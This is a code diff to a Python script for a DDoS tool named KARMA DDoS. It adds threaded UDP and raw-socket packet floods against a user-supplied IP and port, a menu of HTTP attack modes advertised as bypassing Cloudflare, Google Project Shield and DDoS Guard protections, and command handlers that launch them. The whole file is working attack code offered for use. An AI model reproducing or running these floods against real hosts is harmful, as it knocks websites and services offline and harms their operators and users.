@@ -35,6 +35,7 @@ def get_target(url):
         pass
     return target
 
+
 def get_proxies():
     global proxies
     if not os.path.exists("./proxy.txt"):
@@ -73,19 +74,85 @@ def get_cookie(url):
     driver.quit()
     return False
 ##############################################################################################
-def get_info():
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+def get_info_l7():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
     target = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
     thread = input()
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
     t = input()
     return target, thread, t
+
+def get_info_l4():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    port = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, port, thread, t
 ##############################################################################################
+
+#region layer4
+def runflooder(host, port, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    rand = random._urandom(4096)
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
+            thd.start()
+        except:
+            pass
+
+def flooder(host, port, rand, until_datetime):
+    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(rand, (host, int(port)))
+        except:
+            sock.close()
+            pass
+
+
+def runsender(host, port, th, t, payload):
+    if payload == "":
+        payload = random._urandom(60000)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    #payload = Payloads[method]
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=sender, args=(host, port, until, payload))
+            thd.start()
+        except:
+            pass
+
+def sender(host, port, until_datetime, payload):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload, (host, int(port)))
+        except:
+            sock.close()
+            pass
+            
+#endregion
 
 #region METHOD
 
 #region HEAD
+
+def Launch(url, th, t, method): #testing
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
+        except:
+            pass
+
+
 def LaunchHEAD(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(th)):
@@ -448,13 +515,22 @@ def clear():
         system('clear')
 ##############################################################################################
 def help():
-    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"layer7     \n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"layer4 (Soon..)     \n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"tools      \n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"credit    \n")   
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"exit       \n")
-    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
+    stdout.write("                                                                                         \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╩ ╩╚═╝╩═╝╩                \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer7   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show credit                            "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit KARMA DDoS                        "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using KARMA.                "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/HyukIsBack/KARMA-DDoS       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def credit():
@@ -477,12 +553,32 @@ def layer7():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy               "+Fore.LIGHTCYAN_EX+"║\n")                  
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfpro "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)      "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"raw   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Request Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"bypass"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"      "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                 "+Fore.LIGHTCYAN_EX+"║\n")
+    
+    
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Get Request Attack                        "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post  "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Post Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head  "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Head Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2 "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                   "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
+
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("\n")
+##############################################################################################
+def layer4():
+    clear()
+    stdout.write("                                                                                         \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 ##############################################################################################
@@ -516,81 +612,78 @@ def title():
 def command():
     stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Karma"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
     command = input()
-    if command == "cls":
+    if command == "cls" or command == "clear":
         clear()
         title()
-    elif command == "clear":
-        clear()
-        title()
-    elif command == "?":
-        help()
-    elif command == "help":
+    elif command == "help" or command == "?":
         help()
     elif command == "credit":
         credit()        
-    elif command == "layer7":
+    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
         layer7()
-    elif command == "tools":
-        tools()        
-    elif command == "all":
-        layer7()
-        credit()
-        tools()                   
+    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
+        layer4()
+    elif command == "tools" or command == "tool":
+        tools()
     elif command == "exit":
         exit()
-    elif command == "cfb":
-        target, thread, t = get_info()
+    elif command == "test":
+        target, thread, t = get_info_l7()
+        Launch(target, thread, t, "HEAD")
+        time.sleep(10)
+    elif command == "cfb" or command == "CFB":
+        target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchCFB(target, thread, t)
         timer.join()
-    elif command == "pxcfb":
+    elif command == "pxcfb" or command == "PXCFB":
         if get_proxies():
-            target, thread, t = get_info()
+            target, thread, t = get_info_l7()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXCFB(target, thread, t)
             timer.join()
-    elif command == "raw":
-        target, thread, t = get_info()
+    elif command == "get" or command == "GET":
+        target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchRAW(target, thread, t)
         timer.join()
-    elif command == "post":
-        target, thread, t = get_info()
+    elif command == "post" or command == "POST":
+        target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchPOST(target, thread, t)
         timer.join()
-    elif command == "head":
-        target, thread, t = get_info()
+    elif command == "head" or command == "HEAD":
+        target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchHEAD(target, thread, t)
         timer.join()
-    elif command == "pxraw":
+    elif command == "pxraw" or command == "PXRAW":
         if get_proxies():
-            target, thread, t = get_info()
+            target, thread, t = get_info_l7()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXRAW(target, thread, t)
             timer.join()
-    elif command == "soc":
-        target, thread, t = get_info()
+    elif command == "soc" or command == "SOC":
+        target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchSOC(target, thread, t)
         timer.join()
-    elif command == "pxsoc":
+    elif command == "pxsoc" or command == "PXSOC":
         if get_proxies():
-            target, thread, t = get_info()
+            target, thread, t = get_info_l7()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
             LaunchPXSOC(target, thread, t)
             timer.join()
-    elif command == "cfpro":
-        target, thread, t = get_info()
+    elif command == "cfpro" or command == "CFPRO":
+        target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
@@ -599,8 +692,8 @@ def command():
             timer.join()
         else:
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
-    elif command == "cfsoc":
-        target, thread, t = get_info()
+    elif command == "cfsoc" or command == "CFSOC":
+        target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
             timer = threading.Thread(target=countdown, args=(t,))
@@ -610,17 +703,30 @@ def command():
         else:
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
     elif command == "sky":
-        target, thread, t = get_info()
+        target, thread, t = get_info_l7()
         threading.Thread(target=attackSKY, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
     elif command == "stellar":
-        target, thread, t = get_info()
+        target, thread, t = get_info_l7()
         threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "udp" or command == "UDP":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "tcp" or command == "TCP":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+        
 
 ##############################################################################################     
     elif command == "subnet":
